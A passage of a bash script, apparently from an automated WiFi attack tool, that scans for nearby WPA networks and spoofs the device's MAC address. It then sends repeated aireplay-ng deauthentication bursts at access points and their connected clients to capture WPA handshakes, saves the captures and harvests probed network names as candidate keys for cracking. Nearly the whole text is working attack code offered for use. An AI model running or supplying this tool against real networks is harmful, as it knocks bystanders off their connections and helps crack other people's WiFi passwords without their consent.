PAUSE=$(expr "$PAUSE" \* 60 )


requestnumTEST=ZZZ

until [ $requestnumTEST == y ] || [ $requestnumTEST == Y ]; do  

clear
echo ""
echo ""
echo -e "$info$bold  $undr Aireplay-ng Deautherization Counts $txtrst"
echo -e ""
echo -e "$info     The program employs aireplay-ng --deauth when active"
echo -e "  scanning to induce the collection of handshakes."
echo -e "$txtrst"
echo -e "  --deauth      count : deauthenticate 1 or all stations (-0)"
echo ""
echo -e "$inp     Enter the number(i.e. count) of --deauth you wish to send"
echo -e "  at the target network. Twenty(20) to Thirty(30) is normal."
echo -e "$warn  DO NOT Enter Zero(0)!$txtrst"
read requestnum

while  [ $requestnum = 0 ]; do
	echo ""
        echo -e "$warn  !!!Donot use the number Zero(0)!!!"
	echo -e "$q     How many --deauth bursts will you send at the targetAP?(COUNT)$txtrst"
      	read requestnum

	done

	if [[ $ERRORCHK == n ]] || [[ $ERRORCHK == N ]]; then

	requestnumTEST=y

	else

while true

	do

echo ""
echo -e "$inp  You entered$yel $requestnum$inp type$yel (y/Y)$inp to confirm or$yel (n/N)$inp to try again.$txtrst"
	read requestnumTEST

	case $requestnumTEST in
	y|Y|n|N) break ;;
	~|~~)
	echo Aborting -
	exit
	;;

	esac
	echo -e "$warn  !!!Wrong input try again!!!$txtrst"

	done

		fi

			done

white_ap_mac_fn

###############

BOOST_DEVICE_fn

##################### Collect Probes

MANUAL_SELECT_fn()

{

clear

echo -e "$info

    Check Entries
      To change enter$yel line number$info of entry and
    follow program prompts.


      1) Make ESSID Probe Wordlist Files      (y/n)? default=y/Y  \e[1;36m$inp[$yel $USE_PROBE $inp]
$info        Note if files become large program cycle may slow 
           If this slowing occurs rename files in
           the /PROBEESSID_DATA and restart.

      2) Make ESSID Probe Reference File      (y/n)? default=n/N  \e[1;36m$inp[$yel $USE_REF $inp]
$info        Note if files become large program cycle WILL slow 
           When this slowing occurs rename files in
           the /PROBEESSID_DATA and restart.


    C)ontinue$txtrst 
\n"
read var
case $var in

	1) echo -e "\033[36m\n$info Collect ESSID Probes (y/n)?$txtrst"
	read USE_PROBE
	MANUAL_SELECT_fn;;

	2) echo -e "\033[36m\n$info Make ESSID Reference File (y/n)?$txtrst"
	read USE_REF
	MANUAL_SELECT_fn;;

	c|C)

	 if [[ -z $USE_REF || -z $USE_PROBE ]]; then
		echo -e "\033[31m$warn Something is wrong - try again"
		sleep 1
		MANUAL_SELECT_fn
		fi;;

	*) 	MANUAL_SELECT_fn;;
esac

}

#~~~~~~~~~~~~~~~End Manual Handeling End~~~~~~~~~~~~~~~#

MANUAL_SELECT_fn

#############

#let COUNT=COUNT-1
handcol=0

prepare_fn()
{
rm -f /tmp/HANDTEST/*
clear
echo -e "$txtrst"
echo -e "[+] ********** Starting Scan **********"
echo -e "[+] use ctrl+c to terminate the program" 
sleep 2

#variables

if [ "$airmontype" == "Interface" ]; then

monitor="$DEV"mon
sleep 2


echo -e "[+] killing Processes"
airmon-ng check kill &>dev\null # kill processes

	fi

if [ "$airmontype" != "Interface" ]; then

monitor=$MON
sleep 2

	fi

sleep 2

ifconfig $DEV up

# MTeams programmer comments
# Sent to MTeams STO region for review following seen
# bring iw scans into existing timeseldeauh
# Preliminary bugs for MTeams programmer J
# iw scans not consistent if run seperately
# Work from same scan list or channels/essid/bssid may not match
# Do not run many iw scans as do not match run only one then to file
# Due to spaces in essid names use mac addresses instead.
# will only then affect file names will handle w/ awk. 
# some ops like arrays crash slow compuers if not slowed
# run tests w/ slowest computer on persistent usb before release
# General scan then strip out WPA APs.
# 
# Wake APs up 
# Do a few dummy scans to get a better result.
# See prelim coding below

echo -e "[+] Please Standby................"
echo -e "[+] To Wake Up All APs in the Reception Range."
echo -e "[+] Several Preliminary Scans Are Made."

#iw $DEV scan &>dev\null
scan_fn
#iw $DEV scan &>dev\null
scan_fn
#iw $DEV scan &>dev\null
scan_fn
#iw $DEV scan &>dev\null
scan_fn
# Work from same scan list or channels/essid/bssid may not match
# Basic document for all var

iw $DEV scan | cat > /tmp/HANDTEST/iwscan01.txt
echo -e "[+] Scan 5 Writing Scan to file continuing..........."

#Debug 
#echo "Debug"
#echo "Erase all but target for test from /tmp/HANDTEST/iwscan01.txt"
#cp -f /root/iwscan01.txt /tmp/HANDTEST/iwscan01.txt
#read 
#Debug
##############MajoTom add

# Insert newline at the beginning of file
awk 'BEGIN {print "\n"} {print}' /tmp/HANDTEST/iwscan01.txt > /tmp/HANDTEST/iwscan02.txt

# Make one line per AP, replace newlines with tabs, put tab after BSSID
awk 'BEGIN {RS="\nBSS "} NR>1 {gsub(/\n/,"\t"); gsub(/\(on /,"\t"); print}' /tmp/HANDTEST/iwscan02.txt > /tmp/HANDTEST/iwscan03.txt

# Remove non WPA APs
awk '/(WPA:|RSN:)/' /tmp/HANDTEST/iwscan03.txt > /tmp/HANDTEST/iwscan04.txt

# Make a CSV file consisting of BSSID (capitalized), Channel and SSID
sed -r 's/([^\t]*).*SSID: ([^\t]*).*DS Parameter set: channel ([^\t]*).*/\U\1\E,\3,\2/

# Replace spaces with undescores (in SSIDs)

s/ /_/g

# Replace empty SSIDs with [hidden]

s/(,$)/,[hidden]/' /tmp/HANDTEST/iwscan04.txt > /tmp/HANDTEST/iwscan05.txt

# Musket add to replace underscores at end of bssid in kali 1.10a
# Poss cause by vagaries in iw scans
# Sort by SSID descending

# debug Meam Prog if nofile increase sleep time before remove and sort

sleep 2

cat < /tmp/HANDTEST/iwscan05.txt | sed 's/_,/,/g' | sort -t, -k3 -r > /tmp/HANDTEST/iwscan06.txt

SSIDS=$(awk -F, '{print $3}' /tmp/HANDTEST/iwscan06.txt)
BSSIDS=$(awk -F, '{print $1}' /tmp/HANDTEST/iwscan06.txt)
CHANN=$(awk -F, '{print $2}' /tmp/HANDTEST/iwscan06.txt)

if [ ! -d "/root/scans" ]; then mkdir -m 700 /root/scans; fi
TS=$(date +%y%m%d-%H%M)
cp -f /tmp/HANDTEST/iwscan01.txt /root/scans/hsh-$TS.txt
cp -f /tmp/HANDTEST/iwscan06.txt /root/scans/hsh-$TS.csv

number1=$(wc -l <<< "$SSIDS")
number2=$(wc -l <<< "$BSSIDS")
number3=$(wc -l <<< "$CHANN")

####MajorTom Adds end

numi1=$number1 # important for the loop

#Leave to Debug in future
#echo "number1=$number1  SSIDS" 
#echo "number2=$number2  BSSIDS"
#echo "number3=$number3  CHANN"

echo "[+] Target APs Found"
echo "$SSIDS" 
#echo "BSSIDS=$BSSIDS"
#echo "CHANN=$CHANN"

if [[ $number1 == $number2  &&  $number1 == $number3  ]]; then

	echo -e "[+] Scan Successful $number1 WPA Networks Seen."
	echo -e "[+] Standby program is loading.............."
			sleep 2
	echo -e " "

	else 

        echo -e "[+] Scan unsuccessful trying again."
			sleep 3
			prepare_fn
		fi	  

#mac=$(macchanger -s $DEV|grep Current|awk '{ print $3 }') # get mac address
sleep 1

number_of_files=$(ls -A /root/HANDSHAKEHOLD | wc -l)

if [ "$number_of_files" != 0 ]; then

ls -1 /root/HANDSHAKEHOLD/* | xargs -n1 basename | sed 's/-.*//' | awk '{a [$1]++}! (a[$1]-1)' | dos2unix | tr [a-f] [A-F] | cat > /tmp/HANDTEST/caplist.txt 2> /dev/null

# Place in array

sleep 2

readarray bssidcaplist < /tmp/HANDTEST/caplist.txt

# Start array search at zero

	fi

attack_fn

}

attack_fn() 

{                                                                                

#if [ ! -d "/root/scans" ]; then mkdir -m 700 /root/scans; fi
#TS=$(date +%y%m%d-%H%M)
#cp -f /tmp/HANDTEST/iwscan01.txt /root/scans/hsh-$TS.txt
#cp -f /tmp/HANDTEST/iwscan06.txt /root/scans/hsh-$TS.csv

rm -f /tmp/HANDTEST/*
sleep .2

sleep .2
killall -q airodump-ng &>dev\null
sleep .2
killall -q aireplay-ng &>dev\null
sleep .2
killall -q xterm &>dev\null

sleep 3

# Check if handshakes collected
# Make file list with $bssid


if  [[ $numi1 == 0 ]]; then
	
	echo -e "[+] No WPA Encrypted Networks Seen."
	echo -e "[+] Entering Passive Scan Phase for $COUNT Minute(s)."
	sleep 3 
	passive_scan

		fi

if  [[  $numi1 > 0 ]]; then 

	bssidvar=0
	handshakecollect

	    fi

if [[ $numi1 > 0 ]];then

ssid=$(echo $SSIDS|awk '{ print $'$numi1' }') # cut SSID list
bssid=$(echo $BSSIDS|awk '{ print $'$numi1' }')
#To uppercase
bssid=$(echo $bssid | tr [a-f] [A-F])
channel=$(echo $CHANN|awk '{ print $'$numi1' }') # cut Channel list

sleep 3
#########Old
#if [[ "$airmontype" == "Interface" ]]; then

#echo -e "[+] putting $DEV in monitor mode @ $monitor with channel $channel." # notify monitor mode
#sleep 3
#airmon-ng start $DEV &>dev\null # start monitor mode on interface
 
#echo "[+] Spoofing with random mac address."
#	ifconfig $monitor down  
#	macchanger -A $monitor &>dev\null
#	sleep 2 # give op time to complete
#	ifconfig $monitor up
#       randev_mac=$(ifconfig $monitor | awk '{print $5}')
#            sleep 0.5
#       randev_mac=$(echo $randev_mac | awk '{print $1}'| sed -e  's/^\(.\{17\}\).*$/\1/' | sed -r 's/[-]+/:/g') # limit to 17 in length and replace - with :


#		fi

#From varmacscan handels ifconfig dif between kali2.0 and 2016
#############################
if [[ "$airmontype" == "Interface" ]]; then

echo -e "[+] Putting $DEV in monitor mode @ $monitor." # notify monitor mode
sleep 3
airmon-ng start $DEV &>dev\null # start monitor mode on interface
sleep 1
echo "[+] Spoofing with random mac address."

	ifconfig $monitor down  
	iwconfig $monitor mode manage
	macchanger -A $monitor &>dev\null
	sleep 2 # give op time to complete
	ifconfig $monitor up

		if [[ $ifselect == old ]]; then

            randev_mac=$(ifconfig $monitor | awk '{print $5}')
            sleep 1

			fi

		if [[ $ifselect == new ]]; then

randev_mac=$(ifconfig $monitor | awk '{if (($1 == "ether") || ($1 == "unspec")) {print $2}}') 2>/dev/null

		fi

            sleep 1



	# limit to 17 in length and replace - with : and lower to upper

	randev_mac=$(echo $randev_mac | awk '{print $1}'| sed -e  's/^\(.\{17\}\).*$/\1/' | sed -r 's/[-]+/:/g' | sed 's/\([a-z]\)/\U\1/g')

	ifconfig $monitor down
	iwconfig $monitor mode manage
	sleep .5
	ifconfig $monitor hw ether $randev_mac
	sleep 2
	iwconfig $monitor mode monitor
	ifconfig $monitor up

		fi
#############################


if [[ "$airmontype" != "Interface" ]]; then

	ifconfig $DEV down
        iwconfig $DEV mode manage
	ifconfig $DEV up
	ifconfig $DEV down 
	macchanger -A $DEV &>dev\null
	sleep 2  # give time for op
	ifconfig $DEV up 
	VARMAC=$(ifconfig $DEV | grep "$DEV     Link encap:Ethernet  HWaddr " | sed s/"$DEV     Link encap:Ethernet  HWaddr "//g)
	VARMAC=$(echo $VARMAC | awk '{print $1}'| sed -e  's/^\(.\{17\}\).*$/\1/' | sed -r 's/[-]+/:/g' | sed 's/\([a-z]\)/\U\1/g')

	sleep .5
	ifconfig $DEV down
	ifconfig $DEV hw ether $VARMAC
	ifconfig $DEV up
	ifconfig $monitor down &>dev\null
	macchanger -m $VARMAC $monitor &>dev\null
	sleep 2  # give time for op
	ifconfig $monitor up &>dev\null
echo -e "[+] putting $DEV in monitor mode @ $monitor with channel $channel" # notify monitor mode
	ifconfig $DEV down &>dev\null
	iwconfig $DEV mode monitor &>dev\null
	ifconfig $DEV up &>dev\null

		fi

sleep 3
ESSIDNAME2=
clear
echo -e "$txtrst"
echo -e "[+] *******************************"
echo -e "[+] * Active Attack Phase Started *"
echo -e "[+] Attacking Scanned Networks Seen."                                 
echo -e "[+] Cycles Remaining   : $COUNT"
echo -e "[+] Targets This Cycle : $number1"
echo -e "[+] Targets Remaining  : $numi1"
echo -e "[+] current SSID       : $ssid"
echo -e "[+] current BSSID      : $bssid"

if [[ "$airmontype" == "Interface" ]]; then

echo "[+] current Device Mac : $randev_mac"

		fi

if [[ "$airmontype" != "Interface" ]]; then

echo "[+] current Device Mac : $VARMAC"

		fi

echo "[+] Channel            : $channel"

	if [ handcol > 0 ]; then

echo "[+] Total WPA Handshakes Collected = $handcol"
echo "[+] See /root/HANDSHAKEHOLD for .cap files"
echo "[+] Opening airodump-ng to collect handshake."
			fi

if [[ $wpsavail == --wps ]]; then

xterm -g 95x15-1+100 -T "Airodump-ng $ssid" -e "airodump-ng -c $channel --wps --berlin 10000000 --beacons --bssid $bssid -w /tmp/HANDTEST/$bssid  $monitor" 2> /dev/null & airoscan=$!

else

xterm -g 95x15-1+100 -T "Airodump-ng $ssid" -e "airodump-ng -c $channel --bssid $bssid -w /tmp/HANDTEST/$bssid  $monitor" 2> /dev/null & airoscan=$!

	fi

sleep 5

echo "[+] Sending first deauth burst at target network $bssid."

sleep 5

cushion=$requestnum

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid $monitor" 2> /dev/null & airescan=$!

sleep $cushion

echo "[+] Waiting for any handshake exchange to be completed and processed."

sleep 20

kill $airescan 2>/dev\null
killall -q aireplay-ng &>dev\null

echo "[+] Checking .cap file for presence of handshake from first deauth burst."

WPA_CAP_fn

	if [[ $shakstat == 0 ]]; then

echo "[+] Sending second deauth burst at target network $bssid."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid $monitor" 2> /dev/null & airescan=$!

sleep $cushion

echo "[+] Waiting for any handshake exchange to be completed and processed."

sleep 20

kill $airescan 2>/dev\null
killall -q aireplay-ng &>dev\null

###########

echo "[+] Checking .cap file for presence of handshake from second deauth burst."

WPA_CAP_fn

		fi

ASSOC_CLIENT_fn

	if [[ ! -z $CLIASO_MAX ]] && [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+]"
echo -e "$txtrst[+] Beginning Deauth Process against $CLIASO_MAX ."
echo -e "$txtrst[+] Client with highest activity."
echo -e "$txtrst[+] Sending first deauth burst at client $CLIASO_MAX."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MAX $monitor" 2> /dev/null & cliscan=$!

sleep $cushion
sleep 20

kill $cliscan 2>/dev\null
killall -q aireplay-ng &>dev\null


WPA_CAP_fn

		fi

	if [[ ! -z $CLIASO_MAX ]] && [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+] Sending second deauth burst at client $CLIASO_MAX."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MAX $monitor" 2> /dev/null & cliscan=$!

sleep $cushion
sleep 20

kill $cliscan 2>/dev\null
killall -q aireplay-ng &>dev\null

WPA_CAP_fn

		fi

	if [[ ! -z $CLIASO_MID ]] && [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+]"
echo -e "$txtrst[+] Beginning Deauth Process against $CLIASO_MID."
echo -e "$txtrst[+] Client shows lower activity."
echo -e "$txtrst[+] Sending first deauth burst at client $CLIASO_MID."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MID $monitor" 2> /dev/null & cliscan=$!

sleep $cushion
sleep 20

kill $cliscan 2>/dev\null
killall -q aireplay-ng &>dev\null


WPA_CAP_fn

		fi

	if [[ ! -z $CLIASO_MID ]] && [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+] Sending second deauth burst at client $CLIASO_MID."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_MID $monitor" 2> /dev/null & cliscan=$!

sleep $cushion
sleep 20

kill $cliscan 2>/dev\null
killall -q aireplay-ng &>dev\null


WPA_CAP_fn

		fi

	if [[ ! -z $CLIASO_LOW ]] && [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+]"
echo -e "$txtrst[+] Beginning Deauth Process against $CLIASO_LOW."
echo -e "$txtrst[+] Client shows lowest activity."
echo -e "$txtrst[+] Sending first deauth burst at client $CLIASO_LOW."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_LOW $monitor" 2> /dev/null & cliscan=$!

sleep $cushion
sleep 20

kill $cliscan 2>/dev\null
killall -q aireplay-ng &>dev\null


WPA_CAP_fn

		fi

	if [[ ! -z $CLIASO_LOW ]] && [[ $shakstat == 0 ]]; then

echo -e "$txtrst[+] Sending second deauth burst at client $CLIASO_LOW."

xterm -g 80x15-1+400 -T "Aireplay-ng $ssid" -e "aireplay-ng --deauth $requestnum -a $bssid -c $CLIASO_LOW $monitor" 2> /dev/null & cliscan=$!

sleep $cushion
sleep 20

kill $cliscan 2>/dev\null
killall -q aireplay-ng &>dev\null


WPA_CAP_fn

		fi

######################## Check for assocition reattack if assoc seen

sleep .2
kill $airoscan 2>/dev\null
killall -q airodump-ng &>dev\null
sleep .2
killall -q aireplay-ng &>dev\null
sleep .2
killall -q xterm &>dev\null
sleep 3



if [[ "$WPAZERO" != "(0 handshake)" ]]; then

ESSIDNAME=$(wpaclean /tmp/HANDTEST/holdwpaclean /tmp/HANDTEST/"$bssid-01.cap" | awk -F ' ' '{if ($1 == "Net"){ print $3 }}')

sleep 1

#Remove Spaces in ESSIDNAME

if [ ! -z $ESSIDNAME ]; then

	ESSIDNAME1=$(echo $ESSIDNAME | xargs)

	ESSIDNAME2=${ESSIDNAME1// /_}

		fi

# Double Testfor handshake as wpaclean can produce false positives

if [ ! -z $ESSIDNAME2 ]; then
	let handcol=$handcol+1
	DATEFILE=$(date +%y%m%d-%H:%M)
        sleep 1
	chmod 755 /tmp/HANDTEST/$bssid-01.cap 
	cp -f /tmp/HANDTEST/$bssid-01.cap /root/HANDSHAKEHOLD/$bssid-$ESSIDNAME2-$DATEFILE.cap
	sleep 1
    	echo "[+] A Valid Handshake moved to /root/HANDSHAKEHOLD/$bssid-$ESSIDNAME2-$DATEFILE.cap"
	sleep 3

	fi
		fi

########################aircrack-ng module REM

# Loads aircrack-ng into xterm window

#xterm -g 90x30-1+400 -T "Aircrack-ng $ssid" -e "aircrack-ng /root/HANDSHAKEHOLD/$bssid-$ESSIDNAME2-$DATEFILE.cap -w PROBEESSID_DATA/essidprobes8dic.txt 2>&1 | tee /tmp/HANDTEST/aircracktest.txt; sleep 500" &

# Remove control characters and text strings from aircrack-ng tee output file

#cat /tmp/HANDTEST/aircracktest.txt | sed 's/\x1b//g' | sed 's/11B//g' > /tmp/HANDTEST/aircracktest1.txt

# the head -1 produces only first instance  


#		fi
#			fi

#WPAFND=$(cat < /tmp/HANDTEST/"aircracktest1.txt" | grep FOUND! | head -1 | awk '{print $2}' | xargs)

#debug
#echo "WPAFND=$WPAFND"
#read

#if [[ "$WPAFND" == "FOUND!" ]]; then

#	echo "[+] Aircrack-ng has found the WPA Key"
 
#	cat < /tmp/HANDTEST/"aircracktest1.txt" | grep FOUND! | head -1 > /root/HANDSHAKEHOLD/WPA-KEY-FOUND-$bssid-$ESSIDNAME2-$DATEFILE

#	echo "WPA Key found between brackets []" >> /root/HANDSHAKEHOLD/WPA-KEY-FOUND-$bssid-$ESSIDNAME2-$DATEFILE
	 
#	fi

countcsv1=`ls -1 /tmp/HANDTEST/*.csv 2>/dev/null | wc -l`

#echo "debug 2307 $countcsv1"

	if [[ $countcsv1 != 0 ]]; then
		
		cp /tmp/HANDTEST/*.csv  /tmp/ESSIDPROBE_DIR/

		fi

#countcsv1=`ls -1 /root/*.csv 2>/dev/null | wc -l`

#	if [[ $countcsv1 != 0 ]]; then

#	cp -f /root/*.csv /tmp/ESSIDPROBE_DIR/ 2>/dev/null

#		fi

#	echo "[+]"
#    	echo "[+] Copying .csv files to /tmp/ESSIDPROBE_DIR/"

#	if [ -f "/tmp/ESSIDPROBE_DIR/$bssid-01.csv" ]; then

#	if [ -f "/tmp/ESSIDPROBE_DIR/*.csv" ]; then

	countcsv1=`ls -1 /tmp/ESSIDPROBE_DIR/*.csv 2>/dev/null | wc -l`

	if [[ $countcsv1 != 0 ]]; then
    
             echo "[+]"
	     echo "[+] Moving any possible WPA keys in clear text to" 
             echo "[+]   /root/PROBEESSID_DATA/essidprobesdic.txt"
	     echo "[+] for use with aircrack-ng,pyrite or elcomsoft."
	     echo "[+]"
	     sleep 3

	if [[ $USE_PROBE == y || $USE_PROBE == Y ]]; then

		ESSIDPROBE_fn

			fi

	if [[ $USE_REF == y || $USE_REF == Y ]]; then

		ESSIDREF_fn

			fi


		fi

numi1=$(expr "$numi1" - 1) # loop number of networks in the number of SSID from ssid list

if [[ $numi1 = 0 && $COUNT > 0 ]]; then

	passive_scan

		fi

if [[ $numi1 = 0 && $COUNT = 0 ]]; then

exit_fn # exit

	fi

	if [[ "$airmontype" == "Interface" ]]; then

		airmon-ng stop $monitor &>dev\null # stop monitor

		fi

attack_fn # loop back to function

		fi

}

prepare_fn
#done
